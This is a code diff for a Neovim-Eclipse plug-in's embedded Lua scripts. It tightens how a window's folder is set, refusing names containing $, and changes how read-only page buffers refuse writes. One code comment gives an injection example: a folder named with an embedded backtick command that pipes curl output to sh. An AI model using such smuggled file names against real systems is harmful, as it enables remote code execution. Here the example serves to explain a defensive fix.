@@ -1121,8 +1121,8 @@ final class LuaScripts {
      * would take it. With autocommands: entering a window is what the user's config and Neovim
      * expect to hear about, as for any window. Returns the window's id, or -1 for a window that no
      * longer exists (nothing entered). The folder is set with {@code chdir()}, never a command
-     * line, and where it landed is checked ({@link #WINDOWS}, {@code set_folder}): {@code chdir()}
-     * runs nothing in a name but expands {@code $VAR}.
+     * line ({@link #WINDOWS}, {@code set_folder}): {@code chdir()} runs nothing in a name but
+     * expands {@code $VAR}, so a folder with {@code $} in its name is not given.
      */
     static final String FOCUS_WINDOW = """
             local win, from = tonumber((select(1, ...))), tonumber((select(2, ...)))
@@ -1135,9 +1135,11 @@ final class LuaScripts {
               -- another window's folder (probed on 0.12.6).
               local at = vim.fn.win_id2tabwin(from)
               local folder = vim.fn.getcwd(at[2], at[1])
+              -- The windows module is always there: WINDOWS is sent at the session's start, before
+              -- any page can open (NeovimSession), so the nil check only keeps an error out.
               local windows = package.loaded['neovim4eclipse.windows']
               if folder ~= '' and windows then
-                windows.set_folder(win, folder) -- where chdir() lands is checked there
+                windows.set_folder(win, folder) -- a folder with $ is refused there
               end
             end
             vim.api.nvim_set_current_win(win)
@@ -1306,29 +1308,35 @@ final class LuaScripts {
               return vim.fn.getcwd(at[2], at[1])
             end
 
-            --- Gives win the folder of its own (chdir(..., 'window'), never :lcd), and checks where
-            --- it landed, by the one path rule (PATHS). chdir() expands no backticks, wildcards or
-            --- ~, so nothing in a folder's name runs, but it does expand environment variables: a
-            --- folder named e$SHELL lands in e/bin/zsh (probed on 0.12.6). Where it landed, not the
-            --- route there, is checked: a folder it did not land in is undone, and win keeps the
-            --- folder it had. Returns whether win now works in folder. Silent, as chdir() is.
+            --- Gives win a folder of its own (chdir(..., 'window'), never :lcd). Returns whether win
+            --- now works in folder, with a window-local folder. Silent, as chdir() is.
+            ---
+            --- Why a folder with $ is refused: chdir() expands no backticks, wildcards or ~, so
+            --- nothing in a folder's name runs, but it does expand environment variables: a folder
+            --- named e$SHELL lands in e/bin/zsh (probed on 0.12.6), and DirChanged autocommands
+            --- would see that folder. With no $ in the name, chdir() lands in folder or, if it
+            --- fails, changes nothing; the check after it only says which. The cost: an editor on a
+            --- real folder with $ in its name keeps the folder it copied, as when chdir() fails.
+            ---
+            --- Skipped only when win has a local folder that is folder already: a window with
+            --- none follows a later global :cd (example: Neovim's folder is the project's, the
+            --- window copies it without a local one, and a :cd /tmp in another editor moves it).
+            ---
+            --- Paths are compared only by the one rule (PATHS, the first script the session
+            --- sends); without it nothing is changed and false is returned.
             function M.set_folder(win, folder)
               local paths = package.loaded['neovim4eclipse.paths']
-              local same = paths and paths.same or function(a, b) return a == b end
-              local before = folder_of(win)
-              if same(before, folder) then
+              if not paths or folder:find('$', 1, true) then
+                return false
+              end
+              local at = vim.fn.win_id2tabwin(win)
+              if vim.fn.haslocaldir(at[2], at[1]) == 1 and paths.same(folder_of(win), folder) then
                 return true -- there already: no chdir(), so no DirChanged for nothing
               end
               vim.api.nvim_win_call(win, function()
                 pcall(vim.fn.chdir, folder, 'window')
               end)
-              if same(folder_of(win), folder) then
-                return true
-              end
-              vim.api.nvim_win_call(win, function()
-                pcall(vim.fn.chdir, before, 'window')
-              end)
-              return false
+              return paths.same(folder_of(win), folder)
             end
 
             function M.open(buf, folder)
@@ -1354,7 +1362,7 @@ final class LuaScripts {
                 -- chdir(), not :lcd: a command's argument goes through file-name expansion, where
                 -- `...` runs a shell command, so a project folder named evil`curl x|sh` would run it
                 -- the moment one of its files opened. chdir() runs nothing and says nothing, but it
-                -- expands $VAR, so M.set_folder checks where it landed.
+                -- expands $VAR, so M.set_folder refuses a folder with $ in its name.
               end)
               if folder ~= nil and folder ~= '' and not vim.o.autochdir and vim.fn.isdirectory(folder) == 1 then
                 M.set_folder(win, folder)
@@ -2190,9 +2198,12 @@ final class LuaScripts {
      * <p>The buffer is a scratch one that no file has ({@code buftype=nofile}, unlisted, no swap
      * file, kept when hidden), named {@code neovim4eclipse://<name>} so that {@code :ls!} and the
      * status line say what it is, and changeable only while its text is set ({@code nomodifiable}
-     * again at the end), so a page can never be typed into or written: every write, {@code :w x},
-     * {@code :1w x} and {@code :w >> x} too, gets Vim's E382 from the page's own write hooks. Made and filled quietly: no {@code BufNew}, {@code BufFilePost} or {@code TextChanged}
-     * for the user's config or the plug-in's own buffer hooks, which are about files. {@code q} in it
+     * again at the end), so a page can never be typed into or written by accident: every write
+     * that runs autocommands, {@code :w x}, {@code :1w x} and {@code :w >> x} too, gets Vim's E382
+     * from the page's own write hooks. Two deliberate commands still work, as they skip those
+     * hooks by design: {@code :noautocmd w x} writes the page's text to {@code x}, and
+     * {@code :w !cmd} hands it to a shell command. Made and filled quietly: no {@code BufNew},
+     * {@code BufFilePost} or {@code TextChanged} for the user's config or the plug-in's own buffer hooks, which are about files. {@code q} in it
      * closes the page editor ({@code :Eclipse quit}, which names the page's window as its origin);
      * a {@code q} the user mapped for the buffer is kept. The colors are the user's: this is their
      * Neovim. Example: {@code ("messages", {"E486: x", "3 lines yanked"}, {{0, "ErrorMsg"}}, "end")}
@@ -2218,13 +2229,18 @@ final class LuaScripts {
                 vim.b[buf].neovim4eclipse_page = name
                 -- Never written: 'nofile' refuses a plain :w (E382), but Vim writes such a buffer
                 -- under a name (:w x, :1w x, :w >> x, :w! x), straight to disk, behind Eclipse.
-                -- Every way of writing a buffer runs one of these, so each refuses, with Vim's own
-                -- error, and writes nothing. Yanking the text into an editor still works.
+                -- Every write to a file that runs autocommands runs one of these, so each is
+                -- refused and writes nothing. Not caught, on purpose: :noautocmd w x and :w !cmd,
+                -- commands the user types knowing what they do. Yanking the text into an editor
+                -- still works.
+                -- The error as Vim words it, through nvim_echo: a Lua error() would show a stack
+                -- traceback after it (probed on 0.12.6). Neovim puts its own line before it,
+                -- "Error in BufWriteCmd Autocommands for ...", as for any autocommand's error.
                 for _, event in ipairs({ 'BufWriteCmd', 'FileWriteCmd', 'FileAppendCmd' }) do
                   vim.api.nvim_create_autocmd(event, {
                     buffer = buf,
                     callback = function()
-                      error("E382: Cannot write, 'buftype' option is set", 0)
+                      vim.api.nvim_echo({ { "E382: Cannot write, 'buftype' option is set" } }, true, { err = true })
                     end,
                   })
                 end
